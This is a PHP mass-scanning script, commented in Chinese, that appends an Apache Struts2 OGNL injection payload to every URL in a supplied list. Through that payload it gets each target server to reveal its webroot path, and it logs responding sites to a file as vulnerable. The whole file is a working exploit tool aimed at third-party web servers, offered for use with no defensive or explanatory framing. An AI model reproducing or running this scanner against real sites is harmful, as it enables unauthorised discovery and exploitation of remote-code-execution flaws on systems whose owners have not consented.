<?php 

error_reporting(0);
if(empty($argv[1])){
	print_r("

[+]程序还存在一些Bug 比如一些奇葩网站的回显误报相对较低
[+]扫完同目录生成文件名_ok.txt文本存放存在漏洞的网站
->php $argv[0] url.txt
		");exit;
}

$txt = explode("\n",file_get_contents($argv[1]));

echo "[+]$argv[1] 共 ".count($txt)." 条\r\n";

//获取盘符路径POC
$poc = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8";

for($i = 0;$i<count($txt);$i++){
	if(!empty($txt[$i])){
		$u = trim($txt[$i]).$poc;
		$data_str = c($u);
		if(stripos($data_str,"</") || empty($data_str)){
			echo trim($txt[$i])."	No \n";
		}else{
			echo trim($txt[$i])."	Yes	Path:".trim($data_str)." \n";
			$fp = fopen($argv[1]."_OK.txt",'a+');
			fwrite($fp,trim($txt[$i])."\r\n");
			fclose($fp);
		}
	}
}
echo "\r\n[+]扫描完毕 请到".$argv[1]."_OK.txt查看结果";

function c($url){
	$c = curl_init();
	curl_setopt($c,CURLOPT_URL,$url);
	curl_setopt($c,CURLOPT_BINARYTRANSFER,true);
	curl_setopt($c, CURLOPT_HEADER, 0);
	curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)');
	curl_setopt($c, CURLOPT_TIMEOUT, 15);
	curl_setopt($c, CURLOPT_REFERER, $url);
	curl_setopt($c,CURLOPT_RETURNTRANSFER,1);
	$data = curl_exec($c);
	return $data;
	curl_close($c);
}
 ?>
